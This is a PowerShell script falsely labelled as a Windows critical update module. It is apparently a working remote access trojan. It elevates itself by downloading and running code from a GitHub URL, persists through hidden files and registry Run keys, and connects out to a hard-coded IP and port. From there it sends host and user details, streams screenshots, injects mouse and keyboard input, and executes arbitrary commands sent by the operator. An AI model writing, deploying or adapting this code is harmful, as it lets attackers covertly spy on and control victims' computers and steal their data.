<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

# ===== CORREÇÃO DO BOM (BYTE ORDER MARK) =====
$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue
    } catch {}
    exit
}

# ===== PERSISTÊNCIA =====
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
try {
    (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath)
} catch {}

try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
} catch {}
attrib +h +s +r $scriptPath 2>$null

# ===== ASSEMBLIES E P/INVOKE =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

if (-not ("Win32Input" -as [type])) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32Input {
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    }
"@
}

# ===== FUNÇÕES =====
function Get-FrameB64 {
    param([int]$maxW = 1280, [int]$quality = 55)
    try {
        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $bmp.Size)
        $g.Dispose()
        if ($bmp.Width -gt $maxW -and $maxW -gt 0) {
            $dw = $maxW
            $dh = [int]($bmp.Height * $maxW / $bmp.Width)
            $small = New-Object System.Drawing.Bitmap $dw, $dh
            $g2 = [System.Drawing.Graphics]::FromImage($small)
            $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear
            $g2.DrawImage($bmp, 0, 0, $dw, $dh)
            $g2.Dispose(); $bmp.Dispose(); $bmp = $small
        }
        $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
        $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
        $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), [int64]$quality
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, $codec, $ep)
        $bmp.Dispose()
        $bytes = $ms.ToArray(); $ms.Dispose()
        return [Convert]::ToBase64String($bytes)
    } catch { return $null }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    $client = $null; $stream = $null; $reader = $null; $writer = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($serverIP, $serverPort)
        $client.NoDelay = $true
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, $utf8NoBom)
        $writer = New-Object System.IO.StreamWriter($stream, $utf8NoBom)
        $writer.AutoFlush = $true

        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|$($bounds.Width)|$($bounds.Height)|$isAdmin")

        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ([string]::IsNullOrEmpty($cmd)) { continue }

                # --- STREAMING ---
                if ($cmd -eq 'stream_start') {
                    $streaming = $true
                    while ($streaming -and $client.Connected) {
                        if ($stream.DataAvailable) {
                            $c = $reader.ReadLine()
                            if ($c -eq 'stream_stop') { $streaming = $false; break }
                            if ($c -eq 'exit') { $streaming = $false; throw "exit" }
                        }
                        $b64 = Get-FrameB64 -maxW 1280 -quality 55
                        if ($b64) {
                            try { $writer.WriteLine("SCREEN:$b64") } catch { break }
                        }
                        Start-Sleep -Milliseconds 80
                    }
                    try { $writer.WriteLine("STREAM_STOPPED") } catch {}
                    continue
                }

                # --- SCREENSHOT ---
                if ($cmd -eq 'screenshot') {
                    $b64 = Get-FrameB64 -maxW 3840 -quality 85
                    if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
                    continue
                }

                if ($cmd -eq 'exit') { throw "exit" }

                # --- PARSER DE COMANDOS ---
                $parts = $cmd -split ' ', 2
                $verb = $parts[0]
                $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }

                $response = "OK"
                switch ($verb) {
                    'move' {
                        $xy = $arg -split '\s+'
                        if ($xy.Count -eq 2) {
                            $nx = [int]$xy[0]; $ny = [int]$xy[1]
                            $px = [int](($nx / 65535) * $bounds.Width)
                            $py = [int](($ny / 65535) * $bounds.Height)
                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
                        }
                    }
                    'md' {
                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0002, 0,0,0,0) }
                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0008, 0,0,0,0) }
                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0020, 0,0,0,0) }
                    }
                    'mu' {
                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0004, 0,0,0,0) }
                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0010, 0,0,0,0) }
                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0040, 0,0,0,0) }
                    }
                    'mw' {
                        $d = [int]$arg
                        [Win32Input]::mouse_event(0x0800, 0,0,[uint32]$d,0)
                    }
                    'kd' {
                        [Win32Input]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero)
                    }
                    'ku' {
                        [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
                    }
                    'lock_mouse' { 
                        $response = "MOUSE_LOCKED" 
                    }
                    'unlock_mouse' { 
                        $response = "MOUSE_UNLOCKED" 
                    }
                    'test' { $response = "PONG" }
                    'ping' { $response = "PONG" }
                    'exec' {
                        try { $response = Invoke-Expression $arg 2>&1 | Out-String }
                        catch { $response = "EXEC_ERR: $_" }
                    }
                    default { $response = "UNKNOWN: $verb" }
                }
                if ($response) { $writer.WriteLine($response) }
            } else {
                Start-Sleep -Milliseconds 20
            }
        }
    } catch {} finally {
        if ($reader) { $reader.Dispose() }
        if ($writer) { $writer.Dispose() }
        if ($stream) { $stream.Dispose() }
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds 5
}
